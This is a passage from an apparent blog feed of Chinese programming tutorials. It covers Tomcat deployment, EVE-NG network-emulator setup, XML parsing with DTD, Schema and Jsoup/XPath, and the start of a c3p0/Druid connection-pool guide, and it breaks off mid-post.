alt="image.png"></p><ol start="8"><li>登陆之后去软件商店搜索tomcat并安装进行端口配置，然后进行保存，然后重启tomcat</li></ol><p><img src="https://b3logfile.com/file/2020/11/image-23af914b.png" alt="image.png"></p><p>访问看看是否配置成功</p><p><img src="https://b3logfile.com/file/2020/11/image-65add257.png" alt="image.png"></p><ol start="9"><li>上传自己的项目文件(css文件和jsp文件)</li></ol><p><img src="https://b3logfile.com/file/2020/11/image-00e2431a.png" alt="image.png"></p><h2 id="最终效果图"><a href="#最终效果图" class="headerlink" title="最终效果图"></a>最终效果图</h2><p><img src="https://b3logfile.com/file/2020/11/image-ffe42b60.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ECharts </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>EVE-NG入门使用</title>
      <link href="/posts/1565/"/>
      <url>/posts/1565/</url>
      
        <content type="html"><![CDATA[<h4 id="EVE-NG介绍"><a href="#EVE-NG介绍" class="headerlink" title="EVE-NG介绍"></a>EVE-NG介绍</h4><p>eve-ng模拟器是一款非常强大的模拟器，它不仅可以模拟网络设备，也可以运行虚拟机。这款模拟器可以兼容很多厂家的设备，比如华为、思科、华三等等。</p><h4 id="EVE-NG安装"><a href="#EVE-NG安装" class="headerlink" title="EVE-NG安装"></a>EVE-NG安装</h4><ul><li>VMware</li><li>EVE-NG镜像</li></ul><p>eve-ng官方地址（<a href="https://www.eve-ng.net/%EF%BC%89">https://www.eve-ng.net/）</a><br>eve-ng中文网地址（<a href="http://eve-ng.cn/doku.php%EF%BC%89">http://eve-ng.cn/doku.php）</a></p><p>这里我使用的是汉化版，直接下载 EVE-NG汉化版</p><p><img src="https://img.hacpai.com/file/2020/02/image-1c91ae6d.png" alt="image.png"><br>直接点击ovf文件开启虚拟机</p><p>虚拟机的配置根据自己需求进行配置（虚拟化功能需要打开）<br><img src="https://img.hacpai.com/file/2020/02/image-4b0d6462.png" alt="image.png"></p><p>开启虚拟机</p><p><img src="https://img.hacpai.com/file/2020/02/image-56406ca2.png" alt="image.png"><br>访问ip地址<br><img src="https://img.hacpai.com/file/2020/02/image-ffa15bdd.png" alt="image.png"></p><p>安装完成<br><img src="https://img.hacpai.com/file/2020/02/image-1bac10c3.png" alt="image.png"></p><h4 id="EVE-NG配置"><a href="#EVE-NG配置" class="headerlink" title="EVE-NG配置"></a>EVE-NG配置</h4><p>中文网下载EVE-NG-Win-Client-Pack文件安装之后就可以配置设备和抓包</p><p>汉化版的集成镜像</p><p> Dynamips</p><ul><li>C1710</li><li>C3725</li><li>C7200</li></ul><p> IOl</p><ul><li>L2</li><li>L3</li></ul><p>添加镜像</p><ul><li>设备镜像</li><li>文件上传工具</li><li>ssh工具</li></ul><p>先用ssh连接后执行 &#x2F;opt&#x2F;unetlab&#x2F;wrappers&#x2F;unl_wrapper -a fixpermissions 命令修正镜像权限<br>再使用上传工具上传镜像</p><p>上传Dynamips镜像<br>将镜像上传到&#x2F;opt&#x2F;unetlab&#x2F;addons&#x2F;dynamips目录下<br>然后执行 &#x2F;opt&#x2F;unetlab&#x2F;wrappers&#x2F;unl_wrapper -a fixpermissions 命令修正镜像权限</p><p>上传Qemu镜像<br>将镜像目录上传到&#x2F;opt&#x2F;unetlab&#x2F;addons&#x2F;qemu目录下<br>然后执行 &#x2F;opt&#x2F;unetlab&#x2F;wrappers&#x2F;unl_wrapper -a fixpermissions 命令修正镜像权限</p><p>上传IOL镜像<br>将文件全部上传到&#x2F;opt&#x2F;unetlab&#x2F;addons&#x2F;iol&#x2F;bin目录下（其中Python脚本和iourc文件是必须的）<br>使用脚本生成license值，然后替换iourc文件中的值<br>然后执行 &#x2F;opt&#x2F;unetlab&#x2F;wrappers&#x2F;unl_wrapper -a fixpermissions 命令修正镜像权限</p><p>上传镜像后登陆eve-ng会进行加载，进入后创建设备<br><img src="https://img.hacpai.com/file/2020/02/image-8dccb1d6.png" alt="image.png"><br>当设备点亮说明上传成功</p><p>QEMU的下载链接：<br>链接：<a href="http://pan.baidu.com/s/1kUOxPFD">http://pan.baidu.com/s/1kUOxPFD</a> 密码：3duh</p><p>Dynamips的下载链接：<br>链接：<a href="http://pan.baidu.com/s/1bpqyo1p">http://pan.baidu.com/s/1bpqyo1p</a> 密码：zxe1</p><p>IOL的下载链接：<br>链接：<a href="http://pan.baidu.com/s/1dE2psfn">http://pan.baidu.com/s/1dE2psfn</a> 密码：s1fi</p><p>镜像来源于EmulatedLab微信公众号</p>]]></content>
      
      
      <categories>
          
          <category> 网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> eve-ng </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XML入门</title>
      <link href="/posts/62356/"/>
      <url>/posts/62356/</url>
      
        <content type="html"><![CDATA[<h3 id="什么是XML"><a href="#什么是XML" class="headerlink" title="什么是XML"></a>什么是XML</h3><p>Extensible Markup Language 可扩展标记语言。主要用于存储数据。</p><p>基本语法</p><ol><li>xml文档的后缀名 .xml</li><li>xml第一行必须定义为文档声明</li><li>xml文档中有且仅有一个根标签</li><li>属性值必须使用引号引起来</li><li>标签必须正确关闭</li><li>xml标签名称区分大小写</li></ol><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span> ?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Persons</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Person</span> <span class="attr">number</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>张三<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">age</span>&gt;</span>17<span class="tag">&lt;/<span class="name">age</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Person</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Person</span> <span class="attr">number</span>=<span class="string">&quot;2&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>李四<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">age</span>&gt;</span>18<span class="tag">&lt;/<span class="name">age</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Person</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Persons</span>&gt;</span></span><br></pre></td></tr></table></figure><p>标签的命名规则</p><ul><li>名称可以包含字母、数字以及其他的字符 </li><li>名称不能以数字或者标点符号开始 </li><li>名称不能以字母 xml（或者 XML、Xml 等等）开始 </li><li>名称不能包含空格</li></ul><p>XML的特殊字符必须转义，通过CDATA可以保证数据原样输出。xml文档中的所有文本都会被解析器解析，只有CDATA区段中的文本会被解析器忽略。</p><ul><li>格式</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;![CDATA[</span><br><span class="line">原样输出的内容</span><br><span class="line"> ]]&gt;</span><br></pre></td></tr></table></figure><p>XML的约束：规定XML文的书写规则</p><ul><li>DTD（简单的约束）<ul><li><p>内部dtd ：将约束定义在XML文档中</p></li><li><p>外部dtd：将约束的规则定义在外部的dtd文件中<br><code>本地:&lt;!DOCTYPE 根标签名 SYSTEM &quot;dtd文件的位置&quot;&gt;</code><br><code>网络:&lt;!DOCTYPE 根标签名 PUBLIC &quot;dtd文件名字&quot; &quot;dtd文件的位置URL&quot;&gt;</code></p></li></ul></li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span> ?&gt;</span>   </span><br><span class="line"><span class="comment">&lt;!-- 内部 --&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">Persons</span> [   </span></span><br><span class="line"><span class="meta"> <span class="meta">&lt;!ELEMENT <span class="keyword">Persons</span> (<span class="keyword">Person</span>*)&gt;</span>   </span></span><br><span class="line"><span class="meta"> <span class="meta">&lt;!ELEMENT <span class="keyword">Person</span> (<span class="keyword">name</span>,<span class="keyword">age</span>)&gt;</span>   </span></span><br><span class="line"><span class="meta"> <span class="meta">&lt;!ELEMENT <span class="keyword">name</span> (<span class="keyword">#PCDATA</span>)&gt;</span>   </span></span><br><span class="line"><span class="meta"> <span class="meta">&lt;!ELEMENT <span class="keyword">age</span> (<span class="keyword">#PCDATA</span>)&gt;</span>   </span></span><br><span class="line"><span class="meta"> <span class="meta">&lt;!ATTLIST <span class="keyword">Person</span> <span class="keyword">number</span> <span class="keyword">ID</span> <span class="keyword">#REQUIRED</span>&gt;</span>   </span></span><br><span class="line"><span class="meta"> ]&gt;</span>  </span><br></pre></td></tr></table></figure><ul><li>Schema（复杂的约束）</li></ul><p>Schenma 约束XML数据具体类型，存储数据的类型严格按照Schema约束，否则报错。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">students</span>   <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">           <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.stranger-info.top/xml  student.xsd&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">xmlns</span>=<span class="string">&quot;http://www.stranger-info.top/xml&quot;</span></span></span><br><span class="line"><span class="tag">  &gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">student</span> <span class="attr">number</span>=<span class="string">&quot;id_1&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">name</span>&gt;</span>张三<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">age</span>&gt;</span>18<span class="tag">&lt;/<span class="name">age</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">sex</span>&gt;</span>男<span class="tag">&lt;/<span class="name">sex</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">student</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">students</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="解析XML"><a href="#解析XML" class="headerlink" title="解析XML"></a>解析XML</h3><p>操作XML文档，将文档中的数据读取到内存中，或者将内存中的数据写入保存到XML文档中，解析XML的方式主要有两种。</p><ul><li>DOM<br>一次性全部加载进内存，在内存中生成DOM树，所有内存消耗大，不适用内存小的设备，但是DOM操作方便。</li><li>SAX<br>SAX通过事件驱动，逐行读取，读取完一行之后，进行释放，然后读取下一行。所有SAX不占用多少内存，不能对数据进行操作。</li></ul><p>常见的XML解析器</p><ul><li>JAXP</li><li>DOM4J</li><li>Jsoup</li><li>PULL</li></ul><h3 id="Jsoup使用"><a href="#Jsoup使用" class="headerlink" title="Jsoup使用"></a>Jsoup使用</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">//获取文档路径</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> JsoupDemo01.class.getClassLoader().getResource(<span class="string">&quot;hello.xml&quot;</span>).getPath();</span><br><span class="line">    <span class="comment">//解析文档 获取 Document对象</span></span><br><span class="line">    <span class="type">Document</span> <span class="variable">document</span> <span class="operator">=</span> Jsoup.parse(<span class="keyword">new</span> <span class="title class_">File</span>(path), <span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">    <span class="comment">//获取元素对象 </span></span><br><span class="line">    <span class="type">Elements</span> <span class="variable">elements</span> <span class="operator">=</span> document.getElementsByTag(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">    <span class="comment">//获取第一个name的Element对象</span></span><br><span class="line">    <span class="type">Element</span> <span class="variable">element</span> <span class="operator">=</span> elements.get(<span class="number">0</span>);</span><br><span class="line">    <span class="comment">//获取数据</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">text</span> <span class="operator">=</span> element.text();</span><br><span class="line">    System.out.println(text);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> Jsoup.parse (  )</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">parse(File in, String charsetName)：解析xml或html文件的。</span><br><span class="line">parse(String html)：解析xml或html字符串</span><br><span class="line">parse(URL url, int timeoutMillis)：通过网络路径获取指定的html或xml的文档对象</span><br></pre></td></tr></table></figure><p>Document 对象</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">getElementById(String id)：根据id属性值获取唯一的element对象</span><br><span class="line">getElementsByTag(String tagName)：根据标签名称获取元素对象集合</span><br><span class="line">getElementsByAttribute(String key)：根据属性名称获取元素对象集合</span><br><span class="line">getElementsByAttributeValue(String key, String value)：根据对应的属性名和属性值获取元素对象集合</span><br></pre></td></tr></table></figure><p>Elements：元素Element对象的集合。可以当做 ArrayList<Element>来使用</p><p> Element 元素对象</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">getElementById(String id)：根据id属性值获取唯一的element对象</span><br><span class="line">getElementsByTag(String tagName)：根据标签名称获取元素对象集合</span><br><span class="line">getElementsByAttribute(String key)：根据属性名称获取元素对象集合</span><br><span class="line">getElementsByAttributeValue(String key, String value)：根据对应的属性名和属性值获取元素对象集合</span><br><span class="line"></span><br><span class="line">String attr(String key)：根据属性名称获取属性值</span><br><span class="line"></span><br><span class="line">String text():获取文本内容</span><br><span class="line">String html():获取标签体的所有内容(包括字标签的字符串内容)</span><br></pre></td></tr></table></figure><h4 id="selector-选择器使用"><a href="#selector-选择器使用" class="headerlink" title="selector 选择器使用"></a>selector 选择器使用</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">persons</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">person</span> <span class="attr">number</span>=<span class="string">&quot;id_1&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>张三<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">age</span>&gt;</span>18<span class="tag">&lt;/<span class="name">age</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">person</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">person</span> <span class="attr">number</span>=<span class="string">&quot;id_2&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>李四<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">age</span>&gt;</span>18<span class="tag">&lt;/<span class="name">age</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">person</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">persons</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">//获取文档路径</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> JsoupDemo01.class.getClassLoader().getResource(<span class="string">&quot;hello.xml&quot;</span>).getPath();</span><br><span class="line">    <span class="comment">//解析文档 获取Document对象</span></span><br><span class="line">    <span class="type">Document</span> <span class="variable">document</span> <span class="operator">=</span> Jsoup.parse(<span class="keyword">new</span> <span class="title class_">File</span>(path), <span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">    <span class="comment">//获取Person标签并且number属性id_1的age子标签</span></span><br><span class="line">    <span class="type">Elements</span> <span class="variable">elements</span> <span class="operator">=</span> document.select(<span class="string">&quot;person[number=\&quot;id_1\&quot;]&gt;age&quot;</span>);</span><br><span class="line">    System.out.println(elements);</span><br><span class="line">    <span class="comment">/* 输出结果</span></span><br><span class="line"><span class="comment">    &lt;age&gt;</span></span><br><span class="line"><span class="comment">     17</span></span><br><span class="line"><span class="comment">    &lt;/age&gt;</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="Xpath-选择器使用"><a href="#Xpath-选择器使用" class="headerlink" title="Xpath 选择器使用"></a>Xpath 选择器使用</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, XpathSyntaxErrorException &#123;</span><br><span class="line">    <span class="comment">//获取文档路径</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> JsoupDemo01.class.getClassLoader().getResource(<span class="string">&quot;hello.xml&quot;</span>).getPath();</span><br><span class="line">    <span class="comment">//解析文档 获取Document对象</span></span><br><span class="line">    <span class="type">Document</span> <span class="variable">document</span> <span class="operator">=</span> Jsoup.parse(<span class="keyword">new</span> <span class="title class_">File</span>(path), <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">    <span class="comment">//创建JXDocument对象</span></span><br><span class="line">    JXDocument jxDocument=<span class="keyword">new</span> <span class="title class_">JXDocument</span>(document);</span><br><span class="line">    <span class="comment">//查询所有person标签下的name标签</span></span><br><span class="line">    List&lt;JXNode&gt; jxNodes = jxDocument.selN(<span class="string">&quot;//person/name&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(JXNode jxNode:jxNodes)&#123;</span><br><span class="line">        System.out.println(jxNode);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*输出结果</span></span><br><span class="line"><span class="comment">    &lt;name&gt;</span></span><br><span class="line"><span class="comment">    张三</span></span><br><span class="line"><span class="comment">    &lt;/name&gt;</span></span><br><span class="line"><span class="comment">    &lt;name&gt;</span></span><br><span class="line"><span class="comment">    李四</span></span><br><span class="line"><span class="comment">    &lt;/name&gt;</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>xpath : (“&#x2F;&#x2F;标签名[ @属性&#x3D; “属性值”]”）<br>具体查询参考文档</p><blockquote><p>注意：如果XML文档标签首字母大写，则Xpath解析时的标签名小写,例如<code>jxDocument.selN(&quot;//person&quot;)</code>中的person必须小写，否则输出为空。（问题）</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xml </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>连接池的基本使用</title>
      <link href="/posts/48462/"/>
      <url>/posts/48462/</url>
      
        <content type="html"><![CDATA[<h3 id="c3p0-的使用"><a href="#c3p0-的使用" class="headerlink" title="c3p0 的使用"></a>c3p0 的使用</h3><p>C3P0 是一个开源的 JDBC 连接池它实现了数据源和 JNDI 绑定，支持 JDBC3 规范和 JDBC2 的标准扩展。目前使用它的开源项目有<strong>Hibernate</strong>、<strong>Spring</strong>等。</p><h4 id="1、jar-包的导入"><a href="#1、jar-包的导入" class="headerlink" title="1、jar 包的导入"></a>1、jar 包的导入</h4><p><img src="https://img.hacpai.com/file/2019/11/c3p0jar%E5%8C%85-ca3c81a2.PNG" alt="c3p0jar 包.PNG"><br>前两个 jar 包是 c3p0 必须使用的包，最后一个包是 MySQL 连接驱动必须要使用的，只要是连接数据库都需要这个包。（只导入前两个连接数据库会失败）</p><h4 id="2、c3p0-config-xml-文件"><a href="#2、c3p0-config-xml-文件" class="headerlink" title="2、c3p0-config.xml 文件"></a>2、c3p0-config.xml 文件</h4><p>src 目录下建立 c3p0-config.xml 或者 c3p0.properties 文件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">c3p0-config</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 使用默认的配置读取连接池对象 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">default-config</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!--  连接参数 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;driverClass&quot;</span>&gt;</span>com.mysql.jdbc.Driver<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;jdbcUrl&quot;</span>&gt;</span>jdbc:mysql://localhost:3306/test<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;user&quot;</span>&gt;</span>root<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span>&gt;</span>123456<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- 连接池参数 --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 初始化时的连接数量 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;initialPoolSize&quot;</span>&gt;</span>5<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 最大连接数量 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;maxPoolSize&quot;</span>&gt;</span>10<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 超时时间 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;checkoutTimeout&quot;</span>&gt;</span>3000<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">default-config</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">named-config</span> <span class="attr">name</span>=<span class="string">&quot;otherc3p0&quot;</span>&gt;</span> </span><br><span class="line">    <span class="comment">&lt;!--  连接参数 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;driverClass&quot;</span>&gt;</span>com.mysql.jdbc.Driver<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;jdbcUrl&quot;</span>&gt;</span>jdbc:mysql://localhost:3306/<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;user&quot;</span>&gt;</span>root<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span>&gt;</span>123456<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- 连接池参数 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;initialPoolSize&quot;</span>&gt;</span>5<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;maxPoolSize&quot;</span>&gt;</span>8<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;checkoutTimeout&quot;</span>&gt;</span>1000<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">named-config</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">c3p0-config</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="3、连接数据库"><a href="#3、连接数据库" class="headerlink" title="3、连接数据库"></a>3、连接数据库</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String[] args) throws SQLException &#123;</span><br><span class="line">    //创建数据库连接对象</span><br><span class="line">    DataSource dataSource = new ComboPooledDataSource();</span><br><span class="line">    //获取连接对象</span><br><span class="line">    Connection connection = dataSource.getConnection();</span><br><span class="line">    //输出</span><br><span class="line">    System.out.println(connection);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Druid-的使用"><a href="#Druid-的使用" class="headerlink" title="Druid 的使用"></a>Druid 的使用</h3><p>DRUID 是阿里巴巴开源平台上一个数据库连接池实现，它结合了 C3P0、DBCP、PROXOOL 等 DB 池的优点，同时加入了日志监控，可以很好的监控 DB 池连接和 SQL 的执行情况。</p><h4 id="1、jar-包导入"><a href="#1、jar-包导入" class="headerlink" title="1、jar 包导入"></a>1、jar 包导入</h4><p><img src="https://img.hacpai.com/file/2019/11/druid%E5%AF%BC%E5%85%A5-8130aa4d.PNG" alt="druid 导入.PNG"></p><h4 id="2、定义配置文件"><a href="#2、定义配置文件" class="headerlink" title="2、定义配置文件"></a>2、定义配置文件</h4><ul><li>是<code>properties</code>形式的</li><li>可以叫任意名称，可以放在任意目录下</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td 